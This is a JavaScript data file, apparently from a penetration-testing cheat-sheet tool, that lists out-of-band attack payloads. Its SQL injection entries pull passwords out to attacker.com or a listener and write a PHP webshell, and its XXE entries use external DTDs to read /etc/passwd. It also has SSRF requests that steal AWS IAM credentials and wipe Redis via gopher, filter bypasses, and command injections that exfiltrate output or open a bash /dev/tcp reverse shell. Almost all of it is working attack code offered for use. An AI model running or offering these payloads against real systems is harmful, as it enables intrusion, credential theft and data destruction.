export const OOB_TECHNIQUES = [
  {
    category: "Out-of-Band SQLi (OOB SQLi)",
    desc: "Exfiltrate data via DNS/HTTP when blind SQLi has no visible output and time-based is too slow.",
    when: "When the app is vulnerable to SQLi but returns no output and time-based is unreliable.",
    setup: "Start a listener: nc -lvnp 80  OR use Burp Collaborator / interactsh",
    techniques: [
      {
        name: "MySQL — DNS Exfil via LOAD_FILE (UNC path)",
        desc: "Trigger DNS lookup carrying exfiltrated data in the hostname",
        cmd: "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',( SELECT password FROM users LIMIT 1),'.attacker.com\\\\share'))-- -",
        note: "Requires FILE privilege and secure_file_priv to be empty. Windows MySQL only for UNC."
      },
      {
        name: "MySQL — HTTP Exfil via INTO OUTFILE (webshell)",
        desc: "Write data to a web-accessible file",
        cmd: "' UNION SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'-- -",
        note: "Requires FILE privilege and knowledge of web root path."
      },
      {
        name: "MSSQL — DNS Exfil via xp_dirtree",
        desc: "Force MSSQL to make a DNS/SMB request carrying data",
        cmd: "'; EXEC master..xp_dirtree '\\\\'+( SELECT TOP 1 password FROM users)+'.attacker.com\\share'-- -",
        note: "xp_dirtree triggers DNS resolution. Capture with Responder or Burp Collaborator."
      },
      {
        name: "MSSQL — HTTP Exfil via xp_cmdshell",
        desc: "Execute OS command to curl data out",
        cmd: "'; EXEC xp_cmdshell 'curl http://{TARGET_IP}:8080/?data='+(SELECT TOP 1 password FROM users)-- -",
        note: "Requires xp_cmdshell enabled: EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;"
      },
      {
        name: "PostgreSQL — DNS/HTTP via COPY TO PROGRAM",
        desc: "Execute OS command via COPY FROM PROGRAM",
        cmd: "'; COPY (SELECT password FROM users LIMIT 1) TO PROGRAM 'curl http://{TARGET_IP}:8080/?d='||(SELECT password FROM users LIMIT 1)-- -",
        note: "Requires superuser. CVE-2019-9193."
      },
      {
        name: "Oracle — DNS Exfil via UTL_HTTP",
        desc: "Make HTTP request carrying exfiltrated data",
        cmd: "' UNION SELECT UTL_HTTP.REQUEST('http://{TARGET_IP}:8080/?d='||(SELECT password FROM users WHERE rownum=1)) FROM dual-- -",
        note: "Requires EXECUTE on UTL_HTTP. Also try UTL_INADDR.GET_HOST_ADDRESS for DNS."
      },
      {
        name: "Oracle — DNS via UTL_INADDR",
        desc: "Trigger DNS lookup with exfiltrated data in subdomain",
        cmd: "' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM users WHERE rownum=1)||'.attacker.com') FROM dual-- -",
        note: "Pure DNS — no HTTP needed. Works even with strict egress filtering."
      },
      {
        name: "SQLMap OOB with DNS",
        desc: "Automate OOB exfil using SQLMap",
        cmd: "sqlmap -u 'http://{TARGET_IP}/page?id=1' --technique=E --dns-domain=attacker.com --batch",
        note: "Use --dns-domain with a domain you control. SQLMap handles the DNS server."
      },
    ]
  },
  {
    category: "Out-of-Band XXE",
    desc: "Exfiltrate file contents via DNS/HTTP when XXE response is blind (no output in response).",
    when: "When XXE exists but file contents don't appear in the response body.",
    setup: "Host a malicious DTD file: python3 -m http.server 8080  and listen: nc -lvnp 9090",
    techniques: [
      {
        name: "Classic Blind XXE — HTTP Exfil via External DTD",
        desc: "Load external DTD that reads a file and sends it via HTTP",
        cmd: `# Step 1 — host this as evil.dtd on your server:
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % oob "<!ENTITY exfil SYSTEM 'http://{TARGET_IP}:8080/?data=%file;'>">
%oob;

# Step 2 — send this XML payload:
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % dtd SYSTEM "http://{TARGET_IP}:8080/evil.dtd">
  %dtd;
]>
<root>&exfil;</root>`,
        note: "File contents arrive at your HTTP server as a GET parameter."
      },
      {
        name: "Blind XXE — DNS Exfil (no HTTP needed)",
        desc: "Exfiltrate via DNS when HTTP egress is blocked",
        cmd: `# evil.dtd:
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % oob "<!ENTITY exfil SYSTEM 'http://%file;.attacker.com/'>">
%oob;

# Payload:
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY % dtd SYSTEM "http://{TARGET_IP}:8080/evil.dtd">%dtd;]>
<root>&exfil;</root>`,
        note: "Hostname/short values work best for DNS. Use Burp Collaborator to capture."
      },
      {
        name: "XXE via File Upload (SVG/DOCX/XLSX)",
        desc: "Inject XXE through file upload that parses XML",
        cmd: `# SVG file with XXE:
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>`,
        note: "Upload as .svg. Also works in DOCX/XLSX — inject into word/document.xml inside the zip."
      },
      {
        name: "XXE via SOAP/XML API",
        desc: "Inject XXE into SOAP web service",
        cmd: `POST /api/soap HTTP/1.1
Content-Type: text/xml

<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soap:Envelope>
  <soap:Body><name>&xxe;</name></soap:Body>
</soap:Envelope>`,
        note: "Try Content-Type: application/xml and text/xml. Check WSDL for endpoints."
      },
      {
        name: "XXE — SSRF via http:// entity",
        desc: "Use XXE to probe internal services",
        cmd: `<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root>&ssrf;</root>`,
        note: "Probe AWS metadata, internal APIs, localhost services. Try http://127.0.0.1:8080/admin"
      },
    ]
  },
  {
    category: "Out-of-Band SSRF",
    desc: "Force the server to make requests to your controlled server to confirm SSRF and exfiltrate data.",
    when: "When SSRF exists but response is not reflected (blind SSRF).",
    setup: "nc -lvnp 8080  or  python3 -m http.server 8080  to catch callbacks.",
    techniques: [
      {
        name: "Basic Blind SSRF Detection",
        desc: "Confirm SSRF by triggering a callback to your server",
        cmd: "curl 'http://{TARGET_IP}/fetch?url=http://{TARGET_IP}:8080/ssrf-test'",
        note: "If you see a hit on your listener, SSRF is confirmed."
      },
      {
        name: "SSRF — AWS Metadata Exfil",
        desc: "Steal AWS IAM credentials via metadata endpoint",
        cmd: "curl 'http://{TARGET_IP}/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'",
        note: "Then fetch the role name and get the actual keys: /latest/meta-data/iam/security-credentials/ROLE_NAME"
      },
      {
        name: "SSRF — Internal Port Scan",
        desc: "Probe internal services not exposed externally",
        cmd: "for port in 22 80 443 3306 5432 6379 8080 8443 9200; do curl -s 'http://{TARGET_IP}/fetch?url=http://127.0.0.1:'$port -o /dev/null -w \"$port: %{http_code}\\n\"; done",
        note: "Different HTTP codes or response times indicate open ports."
      },
      {
        name: "SSRF — Bypass via DNS Rebinding",
        desc: "Bypass SSRF filters using a domain that resolves to internal IP",
        cmd: "curl 'http://{TARGET_IP}/fetch?url=http://169.254.169.254.nip.io/'",
        note: "nip.io, xip.io, sslip.io resolve any subdomain to the embedded IP."
      },
      {
        name: "SSRF — Protocol Smuggling (gopher://)",
        desc: "Use gopher:// to send raw TCP data (interact with Redis, SMTP, etc.)",
        cmd: "curl 'http://{TARGET_IP}/fetch?url=gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A'",
        note: "URL-encode the gopher payload. Can interact with Redis, Memcached, SMTP, FastCGI."
      },
      {
        name: "SSRF — Bypass Filters (URL tricks)",
        desc: "Bypass blacklist-based SSRF filters",
        cmd: `# Decimal IP:     http://2130706433/  (= 127.0.0.1)
# Octal IP:       http://0177.0.0.1/
# IPv6:           http://[::1]/
# Short URL:      http://127.1/
# Double URL enc: http://127.0.0.1%252F@attacker.com/
# Redirect:       http://attacker.com/redirect?url=http://127.0.0.1/`,
        note: "Try each bypass when the filter blocks 127.0.0.1 or 169.254.169.254 directly."
      },
    ]
  },
  {
    category: "Out-of-Band Command Injection",
    desc: "Exfiltrate command output when the injection is blind (no output in response).",
    when: "When command injection exists but output is not returned in the HTTP response.",
    setup: "nc -lvnp 4444  to catch reverse shells or data.",
    techniques: [
      {
        name: "Blind CMDi — HTTP Exfil",
        desc: "Send command output to your HTTP server",
        cmd: "curl 'http://{TARGET_IP}/ping?ip=127.0.0.1;curl+http://{TARGET_IP}:8080/?d=$(id|base64)'",
        note: "base64 encode to avoid special chars breaking the URL."
      },
      {
        name: "Blind CMDi — DNS Exfil",
        desc: "Exfiltrate via DNS when HTTP is blocked",
        cmd: "127.0.0.1;nslookup+$(whoami).attacker.com",
        note: "Short values only (hostname, username). Use Burp Collaborator to capture."
      },
      {
        name: "Blind CMDi — Out-of-Band Reverse Shell",
        desc: "Get a reverse shell from blind command injection",
        cmd: "127.0.0.1;bash+-c+'bash+-i+>%26+/dev/tcp/{TARGET_IP}/4444+0>%261'",
        note: "URL-encode the payload. + = space in query strings."
      },
      {
        name: "Blind CMDi — Time-Based Confirmation",
        desc: "Confirm injection exists via sleep delay",
        cmd: "127.0.0.1; sleep 5\n127.0.0.1 | ping -c 5 127.0.0.1",
        note: "If response takes 5 seconds longer, injection is confirmed."
      },
    ]
  },
  {
    category: "OOB Infrastructure",
    desc: "Tools and servers to catch out-of-band callbacks (DNS, HTTP, SMTP).",
    when: "Always set up before testing OOB techniques.",
    setup: "",
    techniques: [
      {
        name: "interactsh — All-in-one OOB server",
        desc: "Free public OOB server — catches DNS, HTTP, SMTP callbacks",
        cmd: "# Install:\ngo install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest\n\n# Run:\ninteractsh-client\n# Gives you: abc123.oast.fun — use this as your callback domain",
        note: "Best tool for OOB testing. No setup needed. Use abc123.oast.fun in payloads."
      },
      {
        name: "Burp Collaborator",
        desc: "Built-in OOB server in Burp Suite Pro",
        cmd: "# In Burp: Collaborator tab → Copy to clipboard\n# Use the generated domain in your payloads\n# Poll for interactions in the Collaborator tab",
        note: "Catches DNS, HTTP, HTTPS, SMTP. Requires Burp Suite Pro."
      },
      {
        name: "Simple HTTP Listener",
        desc: "Catch HTTP callbacks locally",
        cmd: "python3 -m http.server 8080\n# or with request logging:\npython3 -c \"from http.server import HTTPServer,BaseHTTPRequestHandler; HTTPServer(('',8080),BaseHTTPRequestHandler).serve_forever()\"",
        note: "Make sure your firewall allows inbound on port 8080."
      },
      {
        name: "DNS Listener (tcpdump)",
        desc: "Capture DNS queries on your server",
        cmd: "sudo tcpdump -i eth0 port 53 -n",
        note: "Requires a domain with NS records pointing to your server."
      },
      {
        name: "Netcat — Catch Raw Connections",
        desc: "Catch any TCP callback",
        cmd: "nc -lvnp 4444",
        note: "Use for reverse shells and raw data exfil."
      },
    ]
  },
]
